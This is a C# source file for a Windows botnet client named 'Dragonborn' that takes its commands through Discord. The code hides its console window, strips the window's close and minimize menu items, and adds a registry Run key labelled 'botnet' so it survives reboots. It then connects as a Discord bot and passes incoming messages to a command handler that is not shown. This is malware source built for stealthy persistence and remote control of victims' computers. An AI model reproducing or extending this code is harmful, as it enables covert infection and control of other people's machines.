using Discord;
using Microsoft.Win32;
using Discord.WebSocket;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Threading;
using System.Diagnostics;

namespace Dragonborn
{
    class Program
    {
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        private static extern int DeleteMenu(IntPtr hMenu, int nPosition, int wFlags);

        [DllImport("user32.dll")]
        private static extern IntPtr GetSystemMenu(IntPtr hWnd, bool bRevert);

        private static DiscordSocketClient _client;
        private string token = "token";
        private int yourDick;
        private long myDick;

        public static void Main(string[] args)
        {
            DeleteMenu(GetSystemMenu(GetConsoleWindow(), false), 0xF060, 0x00000000);
            DeleteMenu(GetSystemMenu(GetConsoleWindow(), false), 0xF030, 0x00000000);
            DeleteMenu(GetSystemMenu(GetConsoleWindow(), false), 0xF020, 0x00000000);
            DeleteMenu(GetSystemMenu(GetConsoleWindow(), false), 0xF130, 0x00000000);

            ShowWindow(GetConsoleWindow(), 0);
            Console.Title = "";
            SetAutorunValue(true);
            new Program().MainAsync().GetAwaiter().GetResult();
        }

        public async Task MainAsync()
        {
            _client = new DiscordSocketClient();
            await _client.LoginAsync(TokenType.Bot, token);
            await _client.StartAsync();
            _client.MessageReceived += Commands.MessageReceived;

            await Task.Delay(-1);
        }

        public static bool SetAutorunValue(bool autorun)
        {
            RegistryKey reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
            try
            {
                if (autorun)
                    reg.SetValue("botnet", Directory.GetCurrentDirectory() + "/" + "botnet.exe");
                else
                    reg.DeleteValue("botnet");

                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
        }
    }
}
